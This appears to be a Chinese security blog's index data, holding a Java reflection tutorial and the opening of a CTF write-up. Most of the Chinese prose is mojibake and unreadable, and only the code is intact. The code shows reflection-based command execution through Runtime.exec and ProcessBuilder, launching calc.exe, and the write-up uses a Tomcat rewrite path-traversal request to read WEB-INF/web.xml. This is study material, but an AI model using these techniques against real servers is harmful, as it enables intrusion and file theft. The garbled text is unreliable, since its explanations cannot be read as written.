å‡½æ•°ç­‰)=\u0026gt;æ“ä½œæˆå‘˜(è¯»å–æˆ–è€…ä¿®æ”¹å€¼ã€è°ƒç”¨æ–¹æ³•ã€åˆ›å»ºå¯¹è±¡ç­‰)\nè·å–å¯¹è±¡\rä¸€èˆ¬ä½¿ç”¨**Class.forName()æ¥è·å–å¯¹è±¡ï¼Œä½¿ç”¨Class.forName()**è·å–å¯¹è±¡éå¸¸ç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦çŸ¥é“ä¸€ä¸ªç±»çš„ç±»åï¼Œå°±å¯ä»¥è·å–åˆ°è¿™ä¸ªç±»çš„å¯¹è±¡ã€‚\n1 2 3 4 5 6 7 8 9 10 package test; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;java.lang.String\u0026#34;); System.out.println(\u0026#34;Class obtained using Class.forName(): \u0026#34; + clazz.getName()); } } // Class obtained using Class.forName(): java.lang.String æˆ‘ä»¬ç°åœ¨çŸ¥é“äº†æœ‰åå°„ï¼ŒåŒæ—¶çŸ¥é“æœ‰ä¸ªRuntimeç±»å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œé‚£ä¸¤è€…ç»“åˆï¼Œé€šè¿‡è¿™ç§åŠ¨æ€è°ƒç”¨çš„å½¢å¼å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚\nJavaä¸­æœ‰ä¸‰ç§ä»£ç å—ï¼šé™æ€åˆå§‹åŒ–å—ï¼ˆstatic blockï¼‰ã€å®ä¾‹åˆå§‹åŒ–å—ï¼ˆinstance initializer blockï¼‰ å’Œ æ„é€ æ–¹æ³•ï¼ˆconstructorï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package test; public class test { public static void main(String[] args) throws Exception { new Test1(); } } class Test1 { public Test1() { System.out.println(\u0026#34;æˆ‘æ˜¯æ„é€ æ–¹æ³•\u0026#34;); } static { System.out.println(\u0026#34;æˆ‘æ˜¯é™æ€åˆå§‹åŒ–å—\u0026#34;); } { System.out.println(\u0026#34;æˆ‘æ˜¯å®ä¾‹åˆå§‹åŒ–å—\u0026#34;); } } /* æˆ‘æ˜¯é™æ€åˆå§‹åŒ–å— æˆ‘æ˜¯å®ä¾‹åˆå§‹åŒ–å— æˆ‘æ˜¯æ„é€ æ–¹æ³• */ é™æ€åˆå§‹åŒ–å—ï¼ˆstatic {}ï¼‰åœ¨ç±»è¢«åŠ è½½åˆ° JVM æ—¶æ‰§è¡Œï¼Œä»…æ‰§è¡Œä¸€æ¬¡ï¼Œåªèƒ½è®¿é—®é™æ€æˆå‘˜ï¼ŒåŒæ—¶åœ¨ä»»ä½•å¯¹è±¡åˆ›å»ºä¹‹å‰æ‰§è¡Œã€‚ å®ä¾‹åˆå§‹åŒ–å—ï¼ˆ{}ï¼‰æ¯æ¬¡åˆ›å»ºå¯¹è±¡æ—¶ï¼Œåœ¨æ„é€ æ–¹æ³•ä¹‹å‰æ‰§è¡Œã€‚ æ„é€ æ–¹æ³•ï¼ˆpublic ClassName() {}ï¼‰æ¯æ¬¡åˆ›å»ºå¯¹è±¡æ—¶ï¼Œåœ¨å®ä¾‹åˆå§‹åŒ–å—ä¹‹åæ‰§è¡Œã€‚ å¯ä»¥çœ‹åˆ°é™æ€åˆå§‹åŒ–å—ä¸­çš„ä»£ç æœ€å…ˆæ‰§è¡Œï¼Œæ„é€ æ–¹æ³•æœ€åæ‰§è¡Œã€‚è€Œ**Class.forName()**å°±æ˜¯ç”¨æ¥æ§åˆ¶é™æ€åˆå§‹åŒ–å—çš„ï¼Œæ‰€ä»¥å®ƒçš„ä¼˜å…ˆçº§éå¸¸é«˜ã€‚å¯ä»¥å¾€è¿›å¡æ¶æ„ä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 package test; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;test.Test1\u0026#34;); } } class Test1 { public Test1() { System.out.println(\u0026#34;æˆ‘æ˜¯æ„é€ æ–¹æ³•\u0026#34;); } static { System.out.println(\u0026#34;hacked\u0026#34;); } { System.out.println(\u0026#34;æˆ‘æ˜¯å®ä¾‹åˆå§‹åŒ–å—\u0026#34;); } } // hacked åˆ›å»ºå¯¹è±¡\rå°±æ˜¯ä½¿ç”¨getDeclaredConstructor()æ¥åˆ›å»ºå®ä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 package test; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;test.Test1\u0026#34;); Object obj = clazz.getDeclaredConstructor().newInstance(); } } class Test1 { public Test1() { System.out.println(\u0026#34;æˆ‘æ˜¯æ„é€ æ–¹æ³•\u0026#34;); } static { System.out.println(\u0026#34;hacked\u0026#34;); } { System.out.println(\u0026#34;æˆ‘æ˜¯å®ä¾‹åˆå§‹åŒ–å—\u0026#34;); } } /* hacked æˆ‘æ˜¯å®ä¾‹åˆå§‹åŒ–å— æˆ‘æ˜¯æ„é€ æ–¹æ³• */ è®¿é—®å­—æ®µ\rå¯ä»¥ä½¿ç”¨è¿™äº›æ–¹æ³•æ¥è®¿é—®å­—æ®µï¼š\nclazz.getField(String name)ï¼šè·å–å…¬æœ‰å­—æ®µï¼ˆåŒ…æ‹¬ç»§æ‰¿çš„ï¼‰\nclazz.getDeclaredField(String name)ï¼šè·å–æœ¬ç±»ä¸­å£°æ˜çš„å­—æ®µï¼ˆåŒ…æ‹¬ç§æœ‰å­—æ®µï¼‰\nfield.setAccessible(true)ï¼šå…è®¸è®¿é—®ç§æœ‰å­—æ®µ\nfield.get(Object obj)ï¼šè·å–å­—æ®µå€¼\nfield.set(Object obj, Object value)ï¼šè®¾ç½®å­—æ®µå€¼\nä»£ç ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package test; import java.lang.reflect.Field; public class test { public static void main(String[] args) throws Exception { // è·å–ç±» Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;test.Cat\u0026#34;); // å®ä¾‹åŒ–ç±»(åˆ›å»ºå¯¹è±¡) Cat cat = (Cat) clazz.newInstance(); // è®¿é—®å…¬æœ‰å­—æ®µ Field publicCat = clazz.getField(\u0026#34;name\u0026#34;); System.out.println(\u0026#34;Get Public Field CatName is: \u0026#34; + publicCat.get(cat)); publicCat.set(cat, \u0026#34;è€„è€‹\u0026#34;); System.out.println(\u0026#34;Get Public Field CatName is: \u0026#34; + publicCat.get(cat)); // è®¿é—®ç§æœ‰å­—æ®µ Field privateCat = clazz.getDeclaredField(\u0026#34;age\u0026#34;); privateCat.setAccessible(true); System.out.println(\u0026#34;Get Private Field Catage is: \u0026#34; + privateCat.get(cat)); privateCat.set(cat, 10); System.out.println(\u0026#34;Get Private Field Catage is: \u0026#34; + privateCat.get(cat)); } } class Cat { public String name = \u0026#34;å“ˆåŸºç±³\u0026#34;; private int age = 2; } /* Get Public Field CatName is: å“ˆåŸºç±³ Get Public Field CatName is: è€„è€‹ Get Private Field Catage is: 2 Get Private Field Catage is: 10 */ è°ƒç”¨æ–¹æ³•\rè°ƒç”¨æ–¹æ³•å’Œè®¿é—®å­—æ®µçš„æ“ä½œå·®ä¸å¤šï¼Œå…·ä½“æµç¨‹ä¸ºï¼š\nè·å– Class =\u0026gt;\nè·å–ç›®æ ‡ Method å¯¹è±¡ï¼ˆå…¬æœ‰ç”¨ getMethodï¼Œç§æœ‰ç”¨ getDeclaredMethodï¼‰=\u0026gt;\nè®¾ç½®å¯è®¿é—®ï¼ˆç§æœ‰æ–¹æ³•è¦ setAccessible(true)ï¼‰=\u0026gt;\nä½¿ç”¨ invoke() è°ƒç”¨æ–¹æ³•\nå¯ä»¥ä½¿ç”¨è¿™äº›æ¥è·å–ï¼š\nclazz.getMethod(String name, Classâ€¦ parameterTypes)ï¼šè·å– å…¬æœ‰æ–¹æ³•ï¼ˆåŒ…æ‹¬ç»§æ‰¿çš„ï¼‰ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–¹æ³•åï¼Œåé¢çš„å‚æ•°è¡¨ç¤ºçš„æ˜¯è¿™ä¸ªæ–¹æ³•ä¼ å…¥å‚æ•°çš„ç±»å‹ï¼Œæ¯”å¦‚å‚æ•°æ˜¯Stringå°±æ˜¯String.classï¼‰\nclazz.getDeclaredMethod(String name, Classâ€¦ parameterTypes)ï¼šè·å– æœ¬ç±»å£°æ˜çš„æ–¹æ³•ï¼ˆåŒ…æ‹¬ç§æœ‰æ–¹æ³•ï¼‰\nmethod.setAccessible(true)ï¼šå…è®¸è®¿é—®ç§æœ‰æ–¹æ³•\nmethod.invoke(Object obj, Objectâ€¦ args)ï¼šè°ƒç”¨æ–¹æ³•ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡ï¼Œåé¢æ˜¯ä¼ å…¥æ–¹æ³•çš„å‚æ•°\nä»£ç ä¾‹å­ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 package test; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { // è·å–ç±» Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;test.Cat\u0026#34;); // å®ä¾‹åŒ–ç±»(åˆ›å»ºå¯¹è±¡) Cat cat = (Cat) clazz.newInstance(); // è°ƒç”¨å…¬æœ‰æ–¹æ³• Method PublicCat = clazz.getMethod(\u0026#34;Ha\u0026#34;, String.class); PublicCat.invoke(cat, \u0026#34;äºº? \u0026#34;); // è°ƒç”¨ç§æœ‰æ–¹æ³• Method privateCat = clazz.getDeclaredMethod(\u0026#34;add\u0026#34;, int.class, int.class); privateCat.setAccessible(true); int result = (int) privateCat.invoke(cat, 1, 1); System.out.println(\u0026#34;å¼ºåŒ–æ™®æ”»æ¬¡æ•°ï¼š \u0026#34; + result); } } class Cat { public void Ha(String name) { System.out.println(name + \u0026#34;å“ˆï¼\u0026#34;); } private int add(int a, int b) { return a + b; // è®¡ç®—æŒ äººæ¬¡æ•°ï¼ˆä¸æ˜¯ï¼‰ } } /* äºº? å“ˆï¼ å¼ºåŒ–æ™®æ”»æ¬¡æ•°ï¼š 2 */ å¦‚æœç±»ä¸­å­˜åœ¨é™æ€æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬å°±ä¸éœ€è¦å†å®ä¾‹åŒ–å¯¹è±¡äº†ï¼Œå¯ä»¥ç›´æ¥æ“ä½œç±»\nå°±åƒè¿™æ ·ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package test; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { Method staticMethod = Cat.class.getMethod(\u0026#34;say\u0026#34;, String.class); String echoed = (String) staticMethod.invoke(null, \u0026#34;æ›¼æ³¢\u0026#34;); System.out.println(echoed); } } class Cat { public static String say(String name) { return \u0026#34;Hello \u0026#34; + name; } } // Hello æ›¼æ³¢ å¦‚æœæ–¹æ³•æ˜¯é™æ€æ–¹æ³•ï¼Œinvoke() çš„ç¬¬ä¸€ä¸ªå‚æ•°å¯ä»¥ä¼  nullï¼Œæ¯•ç«Ÿè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¹Ÿæ²¡æœ‰å…·ä½“çš„å¯¹è±¡ã€‚\nç°åœ¨è®©æˆ‘ä»¬æ¥å¼¹ä¸ªè®¡ç®—å™¨\n1 2 3 4 5 6 7 8 package test; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); clazz.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(clazz.getMethod(\u0026#34;getRuntime\u0026#34;).invoke(clazz), \u0026#34;calc.exe\u0026#34;); } } å…¶ä¸­ï¼Œclazz.getMethod(\u0026quot;exec\u0026quot;, String.class).invoke(clazz.getMethod(\u0026quot;getRuntime\u0026quot;).invoke(clazz), \u0026quot;calc.exe\u0026quot;);\næˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹ä½œæ˜¯ä¸€ä¸ªåµŒå¥—çš„æ–¹æ³•è°ƒç”¨ï¼š\nA.invoke(B, \u0026quot;calc.exe\u0026quot;)ï¼Œå…¶ä¸­ï¼š\nA æ˜¯ clazz.getMethod(\u0026quot;exec\u0026quot;, String.class) çš„ç»“æœã€‚ B æ˜¯ clazz.getMethod(\u0026quot;getRuntime\u0026quot;).invoke(clazz) çš„ç»“æœã€‚ æ ¹æ®è§„åˆ™ï¼ŒJVM è¦æ‰§è¡Œ A.invoke(...)ï¼Œå¿…é¡»å…ˆè®¡ç®—å‡º A å’Œ B çš„å€¼ã€‚\nè®¡ç®— A çš„å€¼: æ‰§è¡Œ clazz.getMethod(\u0026quot;exec\u0026quot;, String.class)ã€‚ è¿™æœ¬èº«åˆæ˜¯ä¸€ä¸ªæ–¹æ³•è°ƒç”¨ (getMethod)ï¼ŒJVM ä¼šå…ˆè®¡ç®—å®ƒçš„å‚æ•°ï¼ˆ\u0026quot;exec\u0026quot; å’Œ String.classï¼‰ï¼Œç„¶åæ‰§è¡Œ getMethodï¼Œè¿”å›ä¸€ä¸ª Method å¯¹è±¡ï¼ˆä»£è¡¨ exec æ–¹æ³•ï¼‰ã€‚ç°åœ¨ A çš„å€¼ç¡®å®šäº†ã€‚ è®¡ç®— B çš„å€¼: æ‰§è¡Œ clazz.getMethod(\u0026quot;getRuntime\u0026quot;).invoke(clazz)ã€‚ è¿™æ˜¯ä¸€ä¸ªé“¾å¼è°ƒç”¨ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒæ‹†æˆ C.invoke(clazz)ï¼Œå…¶ä¸­ C æ˜¯ clazz.getMethod(\u0026quot;getRuntime\u0026quot;) çš„ç»“æœã€‚ æ ¹æ®è§„åˆ™ï¼Œè¦æ‰§è¡Œ C.invoke(...)ï¼Œå¿…é¡»å…ˆè®¡ç®— C çš„å€¼ã€‚ è®¡ç®— C çš„å€¼: æ‰§è¡Œ clazz.getMethod(\u0026quot;getRuntime\u0026quot;)ï¼Œè¿”å›ä¸€ä¸ª Method å¯¹è±¡ï¼ˆä»£è¡¨ getRuntime æ–¹æ³•ï¼‰ã€‚ç°åœ¨ C çš„å€¼ç¡®å®šäº†ã€‚ æ‰§è¡Œ C.invoke(clazz): ç°åœ¨å‚æ•°éƒ½é½äº†ï¼Œå¯ä»¥æ‰§è¡Œ invoke æ–¹æ³•äº†ã€‚è¿™ä¼šè°ƒç”¨ Runtime.getRuntime()ï¼Œè¿”å›ä¸€ä¸ª Runtime å®ä¾‹ã€‚ç°åœ¨ B çš„å€¼ä¹Ÿç¡®å®šäº†ã€‚ æ‰§è¡Œ A.invoke(B, \u0026quot;calc.exe\u0026quot;): ç°åœ¨ï¼Œinvoke æ–¹æ³•çš„æ‰€æœ‰å‚æ•°ï¼ˆB å’Œ \u0026quot;calc.exe\u0026quot;ï¼‰éƒ½è®¡ç®—å®Œæ¯•ã€‚ JVM ç»ˆäºå¯ä»¥æ‰§è¡Œ A æ‰€ä»£è¡¨çš„ exec æ–¹æ³•çš„ invoke è°ƒç”¨äº†ï¼Œè¿™ä¼šè°ƒç”¨ runtimeInstance.exec(\u0026quot;calc.exe\u0026quot;)ã€‚ åŸå› æ˜¯åœ¨Javaä¸­ï¼Œæ–¹æ³•è°ƒç”¨çš„å‚æ•°ï¼Œæ€»æ˜¯åœ¨æ–¹æ³•æœ¬èº«æ‰§è¡Œä¹‹å‰è¢«è®¡ç®—ã€‚\næ‰€ä»¥ä¸Šé¢çš„ä»£ç å±•å¼€æ˜¯è¿™æ ·çš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 package test; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Method getRuntimeMethod = clazz.getMethod(\u0026#34;getRuntime\u0026#34;); Object runtime = getRuntimeMethod.invoke(null); Method execMethod = clazz.getMethod(\u0026#34;exec\u0026#34;, String.class); execMethod.invoke(runtime, \u0026#34;calc.exe\u0026#34;); } } éæ— å‚æ„é€ æ–¹æ³•å’Œç§æœ‰æ–¹æ³•çš„è°ƒç”¨\ræˆ‘ä»¬çŸ¥é“ï¼Œæˆ‘ä»¬æƒ³è¦è°ƒç”¨ä¸€ä¸ªç±»çš„æ–¹æ³•æ‰§è¡Œå‡½æ•°ï¼Œä¸€èˆ¬æƒ…å†µä¸‹éƒ½è¦è·å–åˆ°ç›¸åº”çš„å®ä¾‹å¯¹è±¡ï¼Œç„¶åè°ƒç”¨å®ä¾‹å¯¹è±¡çš„æ–¹æ³•å‡½æ•°\nä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œç”±äºæ²¡æœ‰é‡è½½æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è°ƒç”¨é»˜è®¤çš„æ— å‚æ„é€ æ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹è±¡ï¼›æˆ–æ˜¯ä½¿ç”¨äº†å•ä¾‹æ¨¡å¼ï¼Œä½¿æˆ‘ä»¬å¾—ä»¥è°ƒç”¨é™æ€æ–¹æ³•æ¥è·å–å®ä¾‹å¯¹è±¡ã€‚\né‚£å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œæˆ‘ä»¬æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»å‘¢ï¼Ÿ\nå¦å¤–ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è°ƒç”¨çš„æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œè¦æ€ä¹ˆè°ƒç”¨å‘¢ï¼Ÿ\néæ— å‚æ„é€ æ–¹æ³•\rè¦è§£å†³è¿™ä¸ªé—®é¢˜éœ€è¦ä½¿ç”¨getConstructors()æ–¹æ³•ï¼Œè¿™é‡Œåšä¸€ä¸‹è¡¥å……ï¼š\njava.lang.reflect\rjava.lang.reflect æ˜¯ Java åå°„æœºåˆ¶çš„æ ¸å¿ƒåŒ…ï¼Œæä¾›äº†æ“ä½œç±»åŠå…¶æˆå‘˜ï¼ˆå­—æ®µã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ï¼‰çš„ç±»å’Œæ¥å£ã€‚é€šè¿‡è¿™äº› APIï¼Œå¼€å‘è€…å¯ä»¥åœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°æŸ¥è¯¢å’Œä¿®æ”¹ç±»çš„ç»“æ„ã€‚\n1. Class ç±»\råŠŸèƒ½ï¼šè¡¨ç¤ºç±»çš„å¯¹è±¡ï¼Œæä¾›äº†è·å–ç±»ä¿¡æ¯çš„æ–¹æ³•ï¼Œå¦‚å­—æ®µã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ã€‚\nä¸»è¦æ–¹æ³•\nï¼š\ngetFields()ï¼šè·å–æ‰€æœ‰å…¬å…±å­—æ®µã€‚ getDeclaredFields()ï¼šè·å–æ‰€æœ‰å£°æ˜çš„å­—æ®µï¼ŒåŒ…æ‹¬ç§æœ‰å­—æ®µã€‚ getMethods()ï¼šè·å–æ‰€æœ‰å…¬å…±æ–¹æ³•ã€‚ getDeclaredMethods()ï¼šè·å–æ‰€æœ‰å£°æ˜çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬ç§æœ‰æ–¹æ³•ã€‚ getConstructors()ï¼šè·å–æ‰€æœ‰å…¬å…±æ„é€ å‡½æ•°ã€‚ getDeclaredConstructors()ï¼šè·å–æ‰€æœ‰å£°æ˜çš„æ„é€ å‡½æ•°ï¼ŒåŒ…æ‹¬ç§æœ‰æ„é€ å‡½æ•°ã€‚ getSuperclass()ï¼šè·å–ç±»çš„çˆ¶ç±»ã€‚ getInterfaces()ï¼šè·å–ç±»å®ç°çš„æ‰€æœ‰æ¥å£ã€‚ 2. Field ç±»\råŠŸèƒ½ï¼šè¡¨ç¤ºç±»çš„å­—æ®µï¼ˆå±æ€§ï¼‰ï¼Œæä¾›äº†è®¿é—®å’Œä¿®æ”¹å­—æ®µå€¼çš„æ–¹æ³•ã€‚\nä¸»è¦æ–¹æ³•\nï¼š\nget(Object obj)ï¼šè·å–æŒ‡å®šå¯¹è±¡çš„å­—æ®µå€¼ã€‚ set(Object obj, Object value)ï¼šè®¾ç½®æŒ‡å®šå¯¹è±¡çš„å­—æ®µå€¼ã€‚ getType()ï¼šè·å–å­—æ®µçš„æ•°æ®ç±»å‹ã€‚ getModifiers()ï¼šè·å–å­—æ®µçš„ä¿®é¥°ç¬¦ï¼ˆå¦‚ publicã€privateï¼‰ã€‚ 3. Method ç±»\råŠŸèƒ½ï¼šè¡¨ç¤ºç±»çš„æ–¹æ³•ï¼Œæä¾›äº†è°ƒç”¨æ–¹æ³•çš„èƒ½åŠ›ã€‚\nä¸»è¦æ–¹æ³•\nï¼š\ninvoke(Object obj, Object... args)ï¼šè°ƒç”¨æŒ‡å®šå¯¹è±¡çš„æ–¹æ³•ã€‚ getReturnType()ï¼šè·å–æ–¹æ³•çš„è¿”å›ç±»å‹ã€‚ getParameterTypes()ï¼šè·å–æ–¹æ³•çš„å‚æ•°ç±»å‹ã€‚ getModifiers()ï¼šè·å–æ–¹æ³•çš„ä¿®é¥°ç¬¦ï¼ˆå¦‚ publicã€privateï¼‰ã€‚ 4. Constructor ç±»\råŠŸèƒ½ï¼šè¡¨ç¤ºç±»çš„æ„é€ å‡½æ•°ï¼Œæä¾›äº†åˆ›å»ºå¯¹è±¡çš„èƒ½åŠ›ã€‚\nä¸»è¦æ–¹æ³•\nï¼š\nnewInstance(Object... initargs)ï¼šåˆ›å»ºä¸€ä¸ªæ–°å®ä¾‹ï¼Œä½¿ç”¨æŒ‡å®šçš„æ„é€ å‡½æ•°å‚æ•°ã€‚ getParameterTypes()ï¼šè·å–æ„é€ å‡½æ•°çš„å‚æ•°ç±»å‹ã€‚ getModifiers()ï¼šè·å–æ„é€ å‡½æ•°çš„ä¿®é¥°ç¬¦ï¼ˆå¦‚ publicã€privateï¼‰ã€‚ getConstructor æ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°åˆ—è¡¨ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°æ”¯æŒé‡è½½ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡å‚æ•°åˆ—è¡¨æ¥å”¯ä¸€ç¡®å®šä¸€ä¸ªæ„é€ å‡½æ•°ã€‚\nç”¨ProcessBuilderæ‰§è¡Œå‘½ä»¤æ¥ä¸¾ä¾‹ï¼š\nProcessBuilderæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š\npublic ProcessBuilder(List command) public ProcessBuilder(Stringâ€¦ command) æˆ‘ä»¬åªå…³æ³¨ä½¿ç”¨åå°„çš„æ–¹å¼æ¥è·å–æ„é€ æ–¹æ³•ï¼š\nè°ƒç”¨ç¬¬ä¸€ä¸ªæ„é€ å‡½æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 package test; import java.util.Arrays; import java.util.List; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); clazz.getMethod(\u0026#34;start\u0026#34;).invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;))); } } è°ƒç”¨ç¬¬äºŒä¸ªæ„é€ å‡½æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 package test; import java.util.Arrays; import java.util.List; public class test { public static void main(String[] args) throws Exception { Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;); clazz.getMethod(\u0026#34;start\u0026#34;).invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{\u0026#34;calc.exe\u0026#34;}})); } } æƒ³é€šè¿‡ç¬¬äºŒç§æ„é€ å‡½æ•°å®ç°RCEï¼Œè¿™é‡Œå°±éœ€è¦ç”¨åˆ°å¯å˜é•¿å‚æ•°äº†ï¼Œç”¨...è¡¨ç¤ºå‚æ•°å¯å˜ï¼Œè€Œç”±äºç¼–è¯‘æ—¶å¯å˜é•¿å‚æ•°å…¶å®ä¼šè¢«ç¼–è¯‘æˆæ•°ç»„ï¼Œæ‰€ä»¥String[]å’ŒStringâ€¦å…¶å®æ²¡æœ‰ä»€ä¹ˆå·®åˆ«\nç§æœ‰æ–¹æ³•è°ƒç”¨\rç§æœ‰æ–¹æ³•åªéœ€è¦setAccessible(true)å°±è¡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 package chapter10; import java.lang.reflect.Constructor; public class Java05_Reflect_test { public static void main(String[] args) throws Exception { Class clazz = Class.forName(\u0026#34;java.lang.Runtime\u0026#34;); Constructor m = clazz.getDeclaredConstructor(); m.setAccessible(true); clazz.getMethod(\u0026#34;exec\u0026#34;, String.class).invoke(m.newInstance(), \u0026#34;calc.exe\u0026#34;); } } ä¸è¿‡è¿™ä¸ªåœ¨Java9åŠä»¥ä¸Šç‰ˆæœ¬ä¼šæŠ¥é”™\n","date":"2025-11-09T00:00:00Z","permalink":"https://Oight.github.io/p/java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/","title":"Javaå®‰å…¨å­¦ä¹ "},{"content":"n1cat\rè™½ç„¶æ²¡åšå‡ºæ¥ï¼Œä½†æ˜¯ä¹Ÿå­¦åˆ°äº†ä½ç‰ˆæœ¬JNDIæ³¨å…¥ï¼Œè¿™é‡Œæ•´ç†ä¸€ä¸‹æ€è·¯\né¦–å…ˆæ‰“å¼€ç¤ºä¾‹çœ‹åˆ°éå¸¸ç»å…¸çš„Javaåç«¯é¡µé¢ï¼Œå‘ç°è‡ªå¸¦å‚æ•°nameå’Œword\nä¼ ä¸ª?name={{7*7}}\u0026amp;word=welcomeï¼Œå‘ç°æœ‰æŠ¥é”™ï¼Œå¾—çŸ¥æœåŠ¡å™¨ç”¨çš„æ˜¯Apache Tomcat/9.0.108\næ‰¾æ‰¾è¿™ä¸ªç‰ˆæœ¬çš„Tomcatæœ‰æ²¡æœ‰CVE\nç»“åˆé™„ä»¶\n1 2 RewriteCond %{QUERY_STRING} (^|\u0026amp;)path=([^\u0026amp;]+) RewriteRule ^/download$ /%2 [B,L] å‘ç°ç¬¦åˆCVE-2025-55752çš„ç‰¹å¾\næ¼æ´åŸç†æ˜¯ï¼š\nå˜æ›´å‰çš„å…³é”®ä»£ç  ä»£ç ä½ç½®ï¼šjava/org/apache/catalina/valves/rewrite/RewriteValve.java 1 2 3 #500-597 urlStringRewriteEncoded = RequestUtil.normalize(urlStringRewriteEncoded); chunk.append(URLDecoder.decode(urlStringRewriteEncoded, uriCharset.name())); å˜æ›´åçš„å…³é”®ä»£ç  ä»£ç ä½ç½®ï¼šjava/org/apache/catalina/valves/rewrite/RewriteValve.java 1 2 3 500-597 String urlStringRewriteDecoded = URLDecoder.decode(urlStringRewriteEncoded, uriCharset.name()); urlStringRewriteDecoded = RequestUtil.normalize(urlStringRewriteDecoded); åœ¨é‡å†™ URL åï¼ŒåŸé€»è¾‘å…ˆè°ƒç”¨ normalize() å†è¿›è¡Œ decode()ï¼Œå¯¼è‡´æ— æ³•è¯†åˆ«ç¼–ç åçš„è·¯å¾„éå†å­—ç¬¦ï¼ˆå¦‚ %2e%2e è¡¨ç¤º ..ï¼‰ã€‚ åˆ©ç”¨æ¡ä»¶ï¼š\nå¿…é¡»é…ç½®äº†å¹¶å¯ç”¨äº†RewriteValveé‡å†™è§„åˆ™ï¼ˆserver.xmlï¼‰ å¯ç”¨PUTå’ŒWebDAVåŠŸèƒ½åæ‰å¯ä»¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ æ‰€ä»¥/download?path=%2fWEB-INF%2fweb.xmlå°è¯•ä¸€ä¸‹ï¼Œå‘ç°èƒ½è¯»åˆ°web.xml\n1 welcomeServlet ctf.n1cat.welcomeServlet welcomeServlet / curlä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰å¼€æ”¾PUT\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ curl -X OPTIONS \u0026#34;http://xx.xxx.xxx.xxx:xxxxx\u0026#34; -v * Trying xx.xxx.xxx.xxx:xxxxx... * Connected to xx.xxx.xxx.xxx (xx.xxx.xxx.xxx) port xxxxx * using HTTP/1.x \u0026gt; OPTIONS / HTTP/1.1 \u0026gt; Host: xx.xxx.xxx.xxx:xxxxx \u0026gt; User-Agent: curl/8.15.0 \u0026gt; Accept: */* \u0026gt; * Request completely sent off \u0026lt; HTTP/1.1 200 \u0026lt; Allow: GET, HEAD, OPTIONS \u0026lt; Content-Length: 0 \u0026lt; Date: Sun, 02 Nov 2025 03:21:52 GMT \u0026lt; * Connection å¯æƒœæ²¡æœ‰å¯ç”¨PUTï¼Œæ²¡æ³•RCEï¼Œåªèƒ½è¯»æ–‡ä»¶äº†\nç»“åˆè¯»åˆ°çš„web.xmlï¼Œå¾—åˆ°äº†æœåŠ¡å™¨çš„Servlet 